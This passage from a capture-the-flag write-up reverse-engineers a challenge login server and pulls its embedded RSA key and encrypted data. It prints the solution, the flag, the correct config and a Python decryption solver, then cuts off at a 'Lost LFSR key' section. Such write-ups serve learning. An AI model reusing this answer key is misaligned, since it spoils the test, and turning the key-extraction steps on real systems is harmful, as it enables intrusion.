class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>[SERVER <span class="hljs-type">BINARY</span> INFO]<br>File: server (ELF64 Linux executable)<br>MD5: <span class="hljs-number">7</span>d31caa646134442a71ef88f4a2422da<br>Listens <span class="hljs-keyword">on</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">8080</span><br><br>[SERVER KEY FUNCTIONS]<br>  main (<span class="hljs-number">0x339C</span>): <span class="hljs-keyword">Create</span> socket, accept connections, spawn threads<br>  handle_client_login (<span class="hljs-number">0x29C0</span>): Process login protocol<br>  rsa_decrypt_with_keys (<span class="hljs-number">0x73B2</span>): RSA decryption<br>  rsa_private_decrypt (<span class="hljs-number">0x71E4</span>): RSA_private_decrypt wrapper<br>  rc4_encrypt_and_send (<span class="hljs-number">0x2949</span>): RC4 encrypt <span class="hljs-keyword">and</span> send<br>  rc4_decrypt (<span class="hljs-number">0x6F5C</span>): RC4 decrypt<br><br>[SERVER VERIFICATION DATA]<br>  byte_C0A0 (<span class="hljs-number">256</span> bytes): Expected RSA encrypted AES IV<br>  byte_C1A0 (<span class="hljs-number">256</span> bytes): Expected RSA encrypted AES Key  <br>  byte_C2A0 (<span class="hljs-number">48</span> bytes):  Expected AES encrypted password<br><br>[RSA PRIVATE KEY d]<br>Address: <span class="hljs-number">0x8420</span> (off_C2F0)<br><span class="hljs-keyword">Value</span>: <span class="hljs-number">28</span>c7df24a5798679db2a44979275f5f3179db180d91335702942fb1b70e985de<br>       <span class="hljs-number">825</span>da90f2eb65d20ddf8be1d9d4e15bc1d84e95795ff8c0c28ce3c33fde054f6<br>       e82a4f4cc22597b350c9c62ccc0188bd4152a701a3601558f22aa9fae8b9fdac<br>       <span class="hljs-number">6</span>c2bc09b1637f71e0511805e04b203c4fdb2b36ad232fe819b06ed4e57c74f39<br>       fd9b72623c16ff2100f148f622bf12876260c4859672360dc0da3da6b45c5c8c<br>       <span class="hljs-number">6215</span>ccda072765840c213fba11a91d6bf598a8a8065797566c8950a34ea0a072<br>       a9ed0c38bdc58662f186ec578ca55d5098443fd566cc722ace9c4e89afc4e302<br>       c8a4870e11a003b935f4a102695bfd64bb0fa74dcc372682e2b24ff45a1a69<br>Note: This d doesn<span class="hljs-string">&#x27;t satisfy d*e == 1 mod phi(n), need to recalculate!</span><br><span class="hljs-string"></span><br><span class="hljs-string">[SERVER PROTOCOL FLOW]</span><br><span class="hljs-string">1. Accept client connection</span><br><span class="hljs-string">2. Receive RC4 encrypted &quot;req login...&quot; -&gt; RC4 decrypt -&gt; verify</span><br><span class="hljs-string">3. Send &quot;inp u account&quot; (RC4 encrypted)</span><br><span class="hljs-string">4. Receive RSA encrypted AES Key -&gt; compare with byte_C1A0</span><br><span class="hljs-string">   -&gt; RSA decrypt with private key -&gt; store AES Key</span><br><span class="hljs-string">5. Send &quot;inp u key&quot; (RC4 encrypted)  </span><br><span class="hljs-string">6. Receive RSA encrypted AES IV -&gt; compare with byte_C0A0</span><br><span class="hljs-string">   -&gt; RSA decrypt with private key -&gt; store AES IV</span><br><span class="hljs-string">7. Send &quot;inp u passwd&quot; (RC4 encrypted)</span><br><span class="hljs-string">8. Receive AES encrypted password (48 bytes)</span><br><span class="hljs-string">   -&gt; Compare with byte_C2A0 (no decryption!)</span><br><span class="hljs-string">9. If match: send &quot;login success&quot;, else: send &quot;login error&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">================================================================================</span><br><span class="hljs-string">                              SOLUTION</span><br><span class="hljs-string">================================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">[DECRYPTION STEPS]</span><br><span class="hljs-string">1. RSA decrypt byte_C1A0 -&gt; AES Key: &quot;aassddffgghhjjll&quot; (16 bytes)</span><br><span class="hljs-string">2. RSA decrypt byte_C0A0 -&gt; AES IV:  &quot;qqwweerrttyyuuii&quot; (16 bytes)</span><br><span class="hljs-string">3. AES-CBC decrypt byte_C2A0 with SWAPPED key/iv</span><br><span class="hljs-string">   (Client code uses IV as Key and Key as IV internally)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[IMPORTANT NOTE]</span><br><span class="hljs-string">Client swaps AES Key and IV when calling encryption function!</span><br><span class="hljs-string">Must use: AES.new(IV_value, MODE_CBC, Key_value) to decrypt</span><br><span class="hljs-string"></span><br><span class="hljs-string">[ENCRYPTED PASSWORD (byte_C2A0)]</span><br><span class="hljs-string">add1d11960c22d9166dac3c26725c81909176b238e3003aa57aacba0a226b7c3</span><br><span class="hljs-string">1c220b8d209cb495b55db4e27d4e438e</span><br><span class="hljs-string"></span><br><span class="hljs-string">================================================================================</span><br><span class="hljs-string">                               FLAG</span><br><span class="hljs-string">================================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">  DASCTF&#123;dqmaxfwkm921kr21m;df1m1dqmlk1d12d1&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">================================================================================</span><br><span class="hljs-string">                         CORRECT CONFIG FILE</span><br><span class="hljs-string">================================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">To successfully login, config file should contain:</span><br><span class="hljs-string">  key:qqwweerrttyyuuii  (offset 4-19, used as AES IV)</span><br><span class="hljs-string">  iv:aassddffgghhjjll   (offset 23-38, used as AES Key)  </span><br><span class="hljs-string">  passwd:DASCTF&#123;dqmaxfwkm921kr21m;df1m1dqmlk1d12d1&#125;  (offset 46-87)</span><br><span class="hljs-string"></span><br><span class="hljs-string">================================================================================</span><br><span class="hljs-string">#!/usr/bin/env python3</span><br><span class="hljs-string"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">CTF Client-Server Login Challenge Solver</span><br><span class="hljs-string">Decrypts the password from server data using RSA and AES-CBC</span><br><span class="hljs-string"></span><br><span class="hljs-string">Analysis:</span><br><span class="hljs-string">1. Server has RSA encrypted AES Key (byte_C1A0) and AES IV (byte_C0A0)</span><br><span class="hljs-string">2. Server has AES-CBC encrypted password (byte_C2A0, 48 bytes)</span><br><span class="hljs-string">3. RSA private key d is available in server binary</span><br><span class="hljs-string">4. Need to: RSA decrypt -&gt; get AES key/iv -&gt; AES decrypt -&gt; get flag</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">from Crypto.PublicKey import RSA</span><br><span class="hljs-string">from Crypto.Cipher import AES, PKCS1_OAEP</span><br><span class="hljs-string">from Crypto.Util.Padding import unpad</span><br><span class="hljs-string">import binascii</span><br><span class="hljs-string"></span><br><span class="hljs-string"># RSA parameters from binary (all in hex)</span><br><span class="hljs-string">n_hex = &quot;9a49428cadd84b7a81cb80f916e645a6a9dd23c2fe679f93af6a77eff0f0bb1309b77fb7861275f07ab41e98ae5c2ecf933f27d47b9ce0a55a3e06569cacbb4c9183f8ee9a47f2cfbb3a5965c9326f45d2d608cfeabea1a1879eae95b70224d2e7736b9bc4109756f55a3f70f11a9b9c6564fb6456d329c336fbb59859db5fde1f2338294e863c4f05b4a89e6c3b761d52a2081a0af0a320fde831daa741fad77aa7ef2dd30b3e33d1a6e7b44ed44ef40de4557a4fd65b63db63d105386bbd81071739ec3d0fe44b6a0952a2b065bededfecea6e22229fea32adfc9a6e2ccfdf5da437a56ad41d7ef08c2c4635d3a0218aab2a5ed6e9dd42d684bc918efe24d3&quot;</span><br><span class="hljs-string">e_hex = &quot;10001&quot;</span><br><span class="hljs-string">p_hex = &quot;b782eca6a75067d398dd8ef00e9d024cc554f292d7820a72848d3c619dafaf61ab8f7d719d4cd8ac44351281afd64f8cf23bc8aa5ec48bbd9eb301af50b96f528a108e6643223130a84addd5b9e1ad108c44d706adc5fb097a17ab990f395f3781296e356ac60d64b9a2a641c3e2f593bbe98d38df528a1c67e583ef623b667f&quot;</span><br><span class="hljs-string">q_hex = &quot;d73b03a9b0c4b7e9236d56938d6264e6c8ecaab709effcf02f4e5ec26310273b81089e1cb3d4c050e852721d3daf1d5b7a2be2df02bafcffb77e17d1a8e6428bf87579c859cbe778d3b9ea93aff0d934a0e7b83a1d7a39d0a1779ea18db5fffd99b118c4c2361a22308f54f7ae568e7bf2de6d1b6eb0be1d77eca8edd94f9fad&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># RSA private key d from server binary (at offset 0x8420)</span><br><span class="hljs-string">d_hex = &quot;28c7df24a5798679db2a44979275f5f3179db180d91335702942fb1b70e985de825da90f2eb65d20ddf8be1d9d4e15bc1d84e95795ff8c0c28ce3c33fde054f6e82a4f4cc22597b350c9c62ccc0188bd4152a701a3601558f22aa9fae8b9fdac6c2bc09b1637f71e0511805e04b203c4fdb2b36ad232fe819b06ed4e57c74f39fd9b72623c16ff2100f148f622bf12876260c4859672360dc0da3da6b45c5c8c6215ccda072765840c213fba11a91d6bf598a8a8065797566c8950a34ea0a072a9ed0c38bdc58662f186ec578ca55d5098443fd566cc722ace9c4e89afc4e302c8a4870e11a003b935f4a102695bfd64bb0fa74dcc372682e2b24ff45a1a69&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># Encrypted data from server binary (read from IDA)</span><br><span class="hljs-string"># byte_C0A0: RSA encrypted AES IV (256 bytes)</span><br><span class="hljs-string">encrypted_iv_bytes = [</span><br><span class="hljs-string">    0x37, 0x3a, 0x2a, 0x27, 0xb3, 0x8f, 0xd7, 0x78, 0xc7, 0x16, 0x72, 0x8e, 0xbb, 0x95, 0xbe, 0x89,</span><br><span class="hljs-string">    0xa0, 0xa0, 0x57, 0x10, 0x91, 0x19, 0xa0, 0x8d, 0x5c, 0xe4, 0x92, 0x61, 0xeb, 0xb0, 0xe0, 0x77,</span><br><span class="hljs-string">    0x6d, 0x25, 0x4a, 0x40, 0xc4, 0xd2, 0x1b, 0xd2, 0x46, 0x3e, 0x61, 0x60, 0x87, 0x71, 0xde, 0x40,</span><br><span class="hljs-string">    0x1e, 0xed, 0x13, 0xac, 0x66, 0x60, 0xd9, 0x96, 0xbe, 0xa8, 0xc8, 0xb8, 0x2b, 0xdd, 0x0e, 0xaf,</span><br><span class="hljs-string">    0x56, 0xc3, 0x84, 0x66, 0x77, 0x6e, 0xba, 0x31, 0xf7, 0xb2, 0x21, 0x92, 0x30, 0xb6, 0x54, 0xa7,</span><br><span class="hljs-string">    0x7e, 0xc0, 0xaf, 0x39, 0x5a, 0x01, 0xc3, 0x1c, 0x13, 0x9a, 0x4f, 0x6b, 0x7b, 0x8b, 0xa8, 0x45,</span><br><span class="hljs-string">    0x19, 0x20, 0x96, 0x16, 0x5d, 0xd7, 0xac, 0xd0, 0x33, 0x1e, 0x79, 0xdb, 0xe4, 0x34, 0xed, 0x8c,</span><br><span class="hljs-string">    0x9a, 0x66, 0x58, 0x1d, 0x26, 0xf6, 0x9e, 0x5f, 0xaa, 0x29, 0x5f, 0x66, 0x01, 0x00, 0x76, 0xb9,</span><br><span class="hljs-string">    0x1a, 0x6d, 0xd6, 0x1d, 0xb7, 0xab, 0xd3, 0x25, 0xf8, 0xbd, 0x25, 0xd9, 0x28, 0xde, 0xbc, 0xc0,</span><br><span class="hljs-string">    0x2e, 0x55, 0x55, 0xff, 0x81, 0xf7, 0xae, 0x3e, 0x54, 0x8e, 0x3e, 0x46, 0x59, 0xa3, 0x7f, 0x5d,</span><br><span class="hljs-string">    0x3d, 0x3c, 0x39, 0xfb, 0xca, 0xd1, 0xb5, 0x83, 0xe4, 0x2f, 0xb0, 0x4f, 0xa3, 0x28, 0xeb, 0xb7,</span><br><span class="hljs-string">    0x7e, 0x78, 0x41, 0xf4, 0x5b, 0x71, 0x1e, 0x77, 0xee, 0x23, 0xe1, 0x19, 0x89, 0xdb, 0x2c, 0x0e,</span><br><span class="hljs-string">    0x06, 0xb8, 0x19, 0x1a, 0x45, 0x6d, 0x56, 0xbd, 0x1a, 0x7d, 0x42, 0xc4, 0x7f, 0xdf, 0xdf, 0x11,</span><br><span class="hljs-string">    0x79, 0x22, 0x8b, 0x57, 0xc6, 0xef, 0xca, 0x9b, 0x9b, 0x6a, 0x7d, 0x22, 0x68, 0x2e, 0x5b, 0x67,</span><br><span class="hljs-string">    0xc7, 0xc4, 0x6a, 0x87, 0x7f, 0xb6, 0x77, 0xf5, 0xf3, 0x17, 0xb4, 0x82, 0x3f, 0xcd, 0xc8, 0x12,</span><br><span class="hljs-string">    0xf0, 0x36, 0x2b, 0xe2, 0x7c, 0x0f, 0x54, 0x53, 0x03, 0x71, 0x48, 0xed, 0x30, 0x12, 0x7b, 0x26</span><br><span class="hljs-string">]</span><br><span class="hljs-string"></span><br><span class="hljs-string"># byte_C1A0: RSA encrypted AES Key (256 bytes)</span><br><span class="hljs-string">encrypted_key_bytes = [</span><br><span class="hljs-string">    0x16, 0x38, 0xe0, 0xeb, 0x93, 0x61, 0x40, 0xb5, 0x52, 0x70, 0x33, 0x29, 0x2c, 0xbe, 0xfc, 0xd7,</span><br><span class="hljs-string">    0x3b, 0x55, 0xcf, 0xc7, 0xfb, 0x79, 0xdf, 0x51, 0xae, 0x37, 0x68, 0xa0, 0xdd, 0x9c, 0x84, 0xae,</span><br><span class="hljs-string">    0x45, 0x80, 0xe4, 0x7a, 0x51, 0x33, 0xb4, 0x25, 0xf4, 0xc9, 0x3e, 0xac, 0x97, 0xe4, 0xb1, 0xaa,</span><br><span class="hljs-string">    0x0b, 0x4c, 0xd3, 0x05, 0x89, 0xd0, 0x04, 0xf6, 0xd0, 0xd1, 0x9f, 0xcb, 0xc7, 0x09, 0xe8, 0x6c,</span><br><span class="hljs-string">    0xc2, 0x99, 0x6b, 0x43, 0x3d, 0x29, 0xf6, 0x50, 0xb6, 0x99, 0x87, 0xa4, 0x66, 0xf0, 0x5b, 0xef,</span><br><span class="hljs-string">    0x7f, 0x69, 0x94, 0x58, 0x60, 0xdc, 0xc4, 0x47, 0x42, 0xa5, 0x11, 0xf3, 0x62, 0x13, 0x85, 0xc8,</span><br><span class="hljs-string">    0x9f, 0xbd, 0x4d, 0x73, 0x15, 0x36, 0x15, 0x78, 0x96, 0x34, 0xb2, 0x5c, 0xfc, 0x31, 0x51, 0xa4,</span><br><span class="hljs-string">    0x11, 0x5b, 0xc3, 0x0c, 0x96, 0x97, 0x9e, 0x5f, 0x96, 0x52, 0x90, 0xf3, 0x6a, 0x86, 0x3e, 0x33,</span><br><span class="hljs-string">    0x78, 0xb5, 0xcf, 0xc9, 0xba, 0x31, 0x43, 0x8c, 0x4b, 0xae, 0x22, 0xb2, 0x3e, 0xf8, 0x15, 0xed,</span><br><span class="hljs-string">    0xf7, 0xcf, 0x17, 0x71, 0x80, 0x3b, 0xd3, 0x92, 0xa5, 0x07, 0x2b, 0x46, 0x89, 0x00, 0xb7, 0x5f,</span><br><span class="hljs-string">    0x5a, 0x43, 0x77, 0xd1, 0xda, 0xf3, 0xd6, 0xf7, 0xb7, 0xb6, 0x85, 0x0d, 0x1a, 0x4a, 0x41, 0x34,</span><br><span class="hljs-string">    0xf2, 0xf6, 0x58, 0x40, 0xef, 0xaa, 0x9b, 0x83, 0xd3, 0x10, 0x83, 0x05, 0x1d, 0xf0, 0xfc, 0x80,</span><br><span class="hljs-string">    0xa7, 0x86, 0x52, 0x91, 0x59, 0x48, 0x4f, 0x62, 0xbb, 0xb9, 0x52, 0x4f, 0x68, 0x28, 0x5f, 0x48,</span><br><span class="hljs-string">    0xc7, 0xab, 0x8e, 0x03, 0xbd, 0xfe, 0xca, 0x1a, 0x60, 0x25, 0xaa, 0xed, 0x9f, 0x97, 0x28, 0xb3,</span><br><span class="hljs-string">    0x90, 0x68, 0x9c, 0x0c, 0x96, 0x39, 0x20, 0xc7, 0x28, 0xeb, 0x56, 0x95, 0xfc, 0xb9, 0x41, 0x3f,</span><br><span class="hljs-string">    0x9f, 0x4e, 0x06, 0xd3, 0xb9, 0x3d, 0xb4, 0x0e, 0x26, 0xd6, 0x27, 0x5c, 0x84, 0xe6, 0x12, 0x6a</span><br><span class="hljs-string">]</span><br><span class="hljs-string"></span><br><span class="hljs-string"># byte_C2A0: AES-CBC encrypted password (48 bytes)</span><br><span class="hljs-string">encrypted_password_bytes = [</span><br><span class="hljs-string">    0xad, 0xd1, 0xd1, 0x19, 0x60, 0xc2, 0x2d, 0x91, 0x66, 0xda, 0xc3, 0xc2, 0x67, 0x25, 0xc8, 0x19,</span><br><span class="hljs-string">    0x09, 0x17, 0x6b, 0x23, 0x8e, 0x30, 0x03, 0xaa, 0x57, 0xaa, 0xcb, 0xa0, 0xa2, 0x26, 0xb7, 0xc3,</span><br><span class="hljs-string">    0x1c, 0x22, 0x0b, 0x8d, 0x20, 0x9c, 0xb4, 0x95, 0xb5, 0x5d, 0xb4, 0xe2, 0x7d, 0x4e, 0x43, 0x8e</span><br><span class="hljs-string">]</span><br><span class="hljs-string"></span><br><span class="hljs-string">def main():</span><br><span class="hljs-string">    print(&quot;=&quot; * 60)</span><br><span class="hljs-string">    print(&quot;CTF Solver: Decrypting Login Password&quot;)</span><br><span class="hljs-string">    print(&quot;=&quot; * 60)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # Convert hex to integers</span><br><span class="hljs-string">    n = int(n_hex, 16)</span><br><span class="hljs-string">    e = int(e_hex, 16)</span><br><span class="hljs-string">    p = int(p_hex, 16)</span><br><span class="hljs-string">    q = int(q_hex, 16)</span><br><span class="hljs-string">    d = int(d_hex, 16)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    print(&quot;\n[*] RSA Key Parameters:&quot;)</span><br><span class="hljs-string">    print(f&quot;    n = &#123;n_hex[:32]&#125;...&quot;)</span><br><span class="hljs-string">    print(f&quot;    e = &#123;e_hex&#125;&quot;)</span><br><span class="hljs-string">    print(f&quot;    d = &#123;d_hex[:32]&#125;...&quot;)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # Verify: n == p * q</span><br><span class="hljs-string">    if n == p * q:</span><br><span class="hljs-string">        print(&quot;\n[+] Verified: n == p * q&quot;)</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        print(&quot;\n[-] Error: n != p * q&quot;)</span><br><span class="hljs-string">        return</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # Verify: d * e == 1 (mod phi(n))</span><br><span class="hljs-string">    phi_n = (p - 1) * (q - 1)</span><br><span class="hljs-string">    if (d * e) % phi_n == 1:</span><br><span class="hljs-string">        print(&quot;[+] Verified: d * e == 1 (mod phi(n))&quot;)</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        print(&quot;[-] Warning: d * e != 1 (mod phi(n))&quot;)</span><br><span class="hljs-string">        d_calc = pow(e, -1, phi_n)</span><br><span class="hljs-string">        print(f&quot;[*] Server d:     &#123;hex(d)[:40]&#125;...&quot;)</span><br><span class="hljs-string">        print(f&quot;[*] Calculated d: &#123;hex(d_calc)[:40]&#125;...&quot;)</span><br><span class="hljs-string">        # Use calculated d since server d might be wrong format</span><br><span class="hljs-string">        d = d_calc</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # Create RSA key</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        key = RSA.construct((n, e, d, p, q))</span><br><span class="hljs-string">        print(&quot;[+] RSA key constructed successfully&quot;)</span><br><span class="hljs-string">    except Exception as ex:</span><br><span class="hljs-string">        print(f&quot;[-] Failed to construct RSA key: &#123;ex&#125;&quot;)</span><br><span class="hljs-string">        return</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # Convert encrypted data to bytes</span><br><span class="hljs-string">    encrypted_iv = bytes(encrypted_iv_bytes)</span><br><span class="hljs-string">    encrypted_key = bytes(encrypted_key_bytes)</span><br><span class="hljs-string">    encrypted_password = bytes(encrypted_password_bytes)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    print(f&quot;\n[*] Encrypted data sizes:&quot;)</span><br><span class="hljs-string">    print(f&quot;    RSA encrypted IV:  &#123;len(encrypted_iv)&#125; bytes&quot;)</span><br><span class="hljs-string">    print(f&quot;    RSA encrypted Key: &#123;len(encrypted_key)&#125; bytes&quot;)</span><br><span class="hljs-string">    print(f&quot;    AES encrypted pwd: &#123;len(encrypted_password)&#125; bytes&quot;)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # RSA decrypt with OAEP padding</span><br><span class="hljs-string">    # Note: Server uses RSA_PKCS1_OAEP_PADDING (value 4)</span><br><span class="hljs-string">    cipher_rsa = PKCS1_OAEP.new(key)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        aes_key = cipher_rsa.decrypt(encrypted_key)</span><br><span class="hljs-string">        print(f&quot;\n[+] RSA decrypted AES Key: &#123;aes_key.hex()&#125;&quot;)</span><br><span class="hljs-string">        print(f&quot;    AES Key (ASCII): &#123;aes_key&#125;&quot;)</span><br><span class="hljs-string">    except Exception as ex:</span><br><span class="hljs-string">        print(f&quot;[-] RSA decrypt key failed: &#123;ex&#125;&quot;)</span><br><span class="hljs-string">        # Try raw RSA decryption</span><br><span class="hljs-string">        print(&quot;[*] Trying raw RSA decryption...&quot;)</span><br><span class="hljs-string">        c = int.from_bytes(encrypted_key, &#x27;</span>big<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        m = pow(c, d, n)</span><br><span class="hljs-string">        aes_key = m.to_bytes((m.bit_length() + 7) // 8, &#x27;</span>big<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        print(f&quot;    Raw decrypted: &#123;aes_key.hex()&#125;&quot;)</span><br><span class="hljs-string">        # Extract last 16 bytes (PKCS#1 padding stripped)</span><br><span class="hljs-string">        aes_key = aes_key[-16:] if len(aes_key) &gt; 16 else aes_key</span><br><span class="hljs-string">        print(f&quot;    AES Key: &#123;aes_key.hex()&#125;&quot;)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        aes_iv = cipher_rsa.decrypt(encrypted_iv)</span><br><span class="hljs-string">        print(f&quot;\n[+] RSA decrypted AES IV: &#123;aes_iv.hex()&#125;&quot;)</span><br><span class="hljs-string">        print(f&quot;    AES IV (ASCII): &#123;aes_iv&#125;&quot;)</span><br><span class="hljs-string">    except Exception as ex:</span><br><span class="hljs-string">        print(f&quot;[-] RSA decrypt IV failed: &#123;ex&#125;&quot;)</span><br><span class="hljs-string">        # Try raw RSA decryption</span><br><span class="hljs-string">        print(&quot;[*] Trying raw RSA decryption...&quot;)</span><br><span class="hljs-string">        c = int.from_bytes(encrypted_iv, &#x27;</span>big<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        m = pow(c, d, n)</span><br><span class="hljs-string">        aes_iv = m.to_bytes((m.bit_length() + 7) // 8, &#x27;</span>big<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        print(f&quot;    Raw decrypted: &#123;aes_iv.hex()&#125;&quot;)</span><br><span class="hljs-string">        aes_iv = aes_iv[-16:] if len(aes_iv) &gt; 16 else aes_iv</span><br><span class="hljs-string">        print(f&quot;    AES IV: &#123;aes_iv.hex()&#125;&quot;)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    # AES-CBC decrypt the password</span><br><span class="hljs-string">    print(f&quot;\n[*] Decrypting password with AES-CBC...&quot;)</span><br><span class="hljs-string">    print(f&quot;    Key: &#123;aes_key.hex() if isinstance(aes_key, bytes) else aes_key&#125;&quot;)</span><br><span class="hljs-string">    print(f&quot;    IV:  &#123;aes_iv.hex() if isinstance(aes_iv, bytes) else aes_iv&#125;&quot;)</span><br><span class="hljs-string">    print(f&quot;    Ciphertext: &#123;encrypted_password.hex()&#125;&quot;)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        # Standard AES-CBC decrypt</span><br><span class="hljs-string">        cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)</span><br><span class="hljs-string">        decrypted = cipher_aes.decrypt(encrypted_password)</span><br><span class="hljs-string">        print(f&quot;\n[+] Decrypted (raw hex): &#123;decrypted.hex()&#125;&quot;)</span><br><span class="hljs-string">        print(f&quot;[+] Decrypted (raw bytes): &#123;decrypted&#125;&quot;)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        # Try to unpad PKCS7</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            decrypted_unpadded = unpad(decrypted, 16)</span><br><span class="hljs-string">            print(f&quot;[+] Decrypted (unpadded): &#123;decrypted_unpadded&#125;&quot;)</span><br><span class="hljs-string">        except Exception as pe:</span><br><span class="hljs-string">            print(f&quot;[-] Unpad failed: &#123;pe&#125;&quot;)</span><br><span class="hljs-string">            decrypted_unpadded = decrypted</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        # Note: In client code, the key/iv parameters are swapped!</span><br><span class="hljs-string">        # Client uses &quot;key&quot; from config as IV and &quot;account&quot; as Key</span><br><span class="hljs-string">        # But the actual AES usage is swapped internally</span><br><span class="hljs-string">        print(f&quot;\n[*] Note: Client swaps Key/IV internally&quot;)</span><br><span class="hljs-string">        cipher_correct = AES.new(aes_iv, AES.MODE_CBC, aes_key)</span><br><span class="hljs-string">        decrypted_correct = cipher_correct.decrypt(encrypted_password)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            flag = unpad(decrypted_correct, 16).decode(&#x27;</span>utf<span class="hljs-number">-8</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        except:</span><br><span class="hljs-string">            flag = decrypted_correct.decode(&#x27;</span>utf<span class="hljs-number">-8</span><span class="hljs-string">&#x27;, errors=&#x27;</span>replace<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        print(f&quot;\n&#123;&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27; * 60&#125;&quot;)</span><br><span class="hljs-string">        print(f&quot;[+] FLAG: &#123;flag&#125;&quot;)</span><br><span class="hljs-string">        print(f&quot;&#123;&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27; * 60&#125;&quot;)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    except Exception as ex:</span><br><span class="hljs-string">        print(f&quot;[-] AES decrypt failed: &#123;ex&#125;&quot;)</span><br><span class="hljs-string">        import traceback</span><br><span class="hljs-string">        traceback.print_exc()</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &quot;__main__&quot;:</span><br><span class="hljs-string">    main()</span><br></code></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Lost-LFSR-key"><a href="#Lost-LFSR-key" class="headerlink" title="Lost LFSR key"></a>Lost LFSR key</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 